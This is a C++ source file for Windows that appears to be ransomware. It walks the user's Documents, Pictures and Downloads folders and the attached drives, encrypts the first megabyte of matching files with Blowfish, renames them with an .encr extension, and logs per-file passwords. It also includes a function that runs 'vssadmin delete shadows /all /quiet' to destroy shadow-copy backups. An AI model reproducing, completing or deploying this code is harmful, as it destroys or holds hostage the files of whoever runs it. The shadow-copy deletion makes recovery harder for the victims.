#include "vars.h"


void UpdateDriveList() {
	system("cls");
	std::cout << "Updating list of folders and drives ... ";
	CHAR my_documents[MAX_PATH];    /*Adding path to My Documents to the vector of directories*/
	HRESULT Result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, my_documents);
	if (Result == S_OK) {
		_v_location.push_back(my_documents);
	}
	CHAR my_pictures[MAX_PATH];	/*Adding path to My Pictures to the vector of directories*/
	Result = SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, SHGFP_TYPE_CURRENT, my_pictures);
	if (Result == S_OK) {
		_v_location.push_back(my_pictures);
	}
	WCHAR* folderpath;   /*Adding path to Downloads folder*/
	Result = SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &folderpath);
	char ch[260];
	char DefChar = ' ';
	WideCharToMultiByte(CP_ACP, 0, folderpath, -1, ch, 260, &DefChar, NULL);
	std::string my_downloads(ch);
	_v_location.push_back(my_downloads);

	wchar_t szDrives[MAX_PATH];
	if (GetLogicalDriveStrings(MAX_PATH, szDrives))
	{
		wchar_t* pDrive = szDrives;
		while (*pDrive) {
			if (pDrive == L"C:\\") {
				pDrive += wcslen(pDrive) + 1;
			}
			else {
				WideCharToMultiByte(CP_ACP, 0, pDrive, -1, ch, 260, &DefChar, NULL);
				std::string my_path(ch);
				_v_location.push_back(my_path);
			}
			pDrive += wcslen(pDrive) + 1;
		}

	}
	_v_location.erase(_v_location.begin() + 3);;
	printf ( "Done!\n");
}

std::string GeneratePassword()
{
	srand(time(NULL));
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	std::string tmp_s;
	tmp_s.reserve(PASSWORD_LENGTH);

	for (int i = 0; i < PASSWORD_LENGTH; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	return tmp_s;
}

void Encrypt(std::string _filePath, std::string _password)
{
	unsigned long long length;
	Blowfish blowfish;
	unsigned char key[PASSWORD_LENGTH];
	std::copy(_password.begin(), _password.end(), key);
	try {
		blowfish.SetKey(key, sizeof(key));
		std::string _s_fileName = _filePath;
		std::string _s_new_fileName = _filePath;
		_s_new_fileName.append(".encr");
		unsigned long long file_length = 0;
		//std::ifstream inFile(_s_fileName, std::ios::binary);
		//std::ofstream outFile(tmpString, std::ios::binary);
		std::fstream file;
		file.open(_s_fileName, std::ios::binary | std::ios::in | std::ios::out | std::ios::ate);
		file.seekg(0, std::ios::end);
		length = file.tellg();
		file_length = length;
		/*Checking the size of file*/
		if (length > 1048576){
			length = 1048576;
		};
		char* encr_buf = new char[length + 1];
		file.seekg(0, std::ios::beg);
		file.read(encr_buf, length);
		char* encr_out_buf = new char[length+1];
		blowfish.Encrypt((unsigned char*)encr_out_buf, (unsigned char*)encr_buf, length); /*<-Encrypting file content*/
		file.seekg(0, std::ios::beg);
		/*Replacing the first mb or all file with encrypted bytes*/
		for (unsigned long long i = 0; i <= length; i++) {
			file << encr_out_buf[i];
		}
		file.close();
		rename(_s_fileName.c_str(), _s_new_fileName.c_str()); /*Rename the original file to .encr version*/
		delete[] encr_buf;
		delete[] encr_out_buf;

	}
	catch (int e) {
		std::cout << "Error with encrypting file " << _filePath <<"\n";
	}
}

bool StartEncryption()
{	
	try {
		/*Updating the list of folders and drives to the vector of strings _v_location
		The first will be %USER%\My Documents, and etc. */
		UpdateDriveList();
	}
	catch (int e) {
		std::cout << "Error updating folders";
	}try {
		/*Start search files in the folders and drives according to the _v_location*/
		for (int i = 0; i < _v_location.size(); i++) {
			try {
				std::cout << "Start encrypting files in folder " << _v_location[i] << "\n";
				std::wstring ws = std::wstring(_v_location[i].begin(), _v_location[i].end());
				LPWSTR lp = new wchar_t[_v_location[i].size() + 1];
				std::copy(ws.begin(), ws.end(), lp);
				lp[ws.size()] = 0;
				SearchFile(lp);
				_is_success = true;
				delete[] lp;
			}
			catch (int e) {
				printf("ERROR File search");
			}
		}
		
	}
	catch (int e) {
		std::cout << "Error during Encryption";
	}
	return false;
}

void SearchFile(LPWSTR path)
{
	WIN32_FIND_DATA wfd = { 0 };
	SetCurrentDirectory(path); /*Setting the path according to the _v_location*/
	HANDLE search = FindFirstFile(L"*", &wfd); /*Find the first file in the current path*/
	if (search == INVALID_HANDLE_VALUE) {
		return;
	}
	do {
		LPWSTR strTmp = (LPWSTR)calloc(MAX_PATH + 1, sizeof(WCHAR));
		GetCurrentDirectory(MAX_PATH, strTmp);
		wcscat_s(strTmp, MAX_PATH, L"\\");
		wcscat_s(strTmp, MAX_PATH, wfd.cFileName);
		LPWSTR strTmp_ = (LPWSTR)calloc(wcslen(strTmp) + 1, sizeof(WCHAR));
		wcscpy_s(strTmp_, wcslen(strTmp) + 1, strTmp);
		if (wcscmp(wfd.cFileName, L".") && wcscmp(wfd.cFileName, L"..")) {
			wcscat_s(strTmp, MAX_PATH, L"\t\t\t");
			/*Checking if current file is directory*/
			if (((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) &&(!(wfd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)) && (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))) {
				SearchFile(strTmp_);
				SetCurrentDirectory(path);
			}
			else {
				/*Checking if current file is same type according to the mask parameter, which contain the vector _v_file_extension*/
				std::wstring ws = wfd.cFileName;
				std::string tmpString(ws.begin(), ws.end());
				for (int i = 0; i < _v_file_extension.size(); i++) {
					if (tmpString.find(_v_file_extension[i]) != std::string::npos && tmpString.find(".encr") == std::string::npos) {
						/*If file is the correct type -> proceed to generate password and start to encrypt it*/
						std::string password = GeneratePassword();
						_v_filenames.push_back(tmpString);
						_passwords.push_back(password);
						Encrypt(tmpString, password);
					}
				}
			}
		}
	} while (FindNextFile(search, &wfd));
	FindClose(search);
}


int main() {
		char myPath[_MAX_PATH + 1];
		_log_file = std::string(myPath,GetModuleFileNameA(NULL, myPath, _MAX_PATH));
		int i = _log_file.find_last_of("\\");
		_log_file.erase(i, _log_file.size());
		_log_file.append("\\");
		std::string ProgramFolder = _log_file;
		_log_file.append(TXT_FILE);
		try {
			remove(_log_file.c_str());
		}
		catch (int e) {

		}
		/*Init the thread for core process (Scanning of disks, search and encrypt files)*/
	 	HANDLE ProcessThread = CreateThread(NULL, 0, SearchEngine, NULL, 0, 0);
	 	WaitForSingleObject(ProcessThread, INFINITE); /*Waiting to finish thread*/
	 	CloseHandle(ProcessThread);
		SetCurrentDirectoryA(ProgramFolder.c_str());
		if (_is_success) {
			system("Notepad \"Finish.out\"");
		}
	return 0;
}


DWORD WINAPI SearchEngine(LPVOID lpParameter) {			/*Thread fuction*/
	try {
		/*Calling Function for process*/
		StartEncryption();
	}
	catch (int e) {
		std::cout << "Encrytpion engine error";
	}
	/*Write log file with names and passwords*/
	unsigned long long i = 0;
	for (i = 0; i < _v_filenames.size(); i++) {
		writeLogFile(_v_filenames[i], _passwords[i]);
	}
	ExitThread(0);
}

void DeleteAllShadowCopies()
{
	try {
		system("vssadmin delete shadows /all /quiet");
		std::cout << "All shadow copies are deleted!\n";
	}
	catch (int e) {
		std::cout << "Cannot delete shadow copies!\n";
	}
}

void writeLogFile(std::string _filename, std::string password)
{
	std::fstream file;
	file.open(_log_file, std::ios_base::app | std::ios_base::in);
	if (file.is_open()) {
		file << std::endl << "file : " << _filename << " password : " << password;
		file.close();
	}
	else {
		std::cout << "Error writing log file";
	}
}
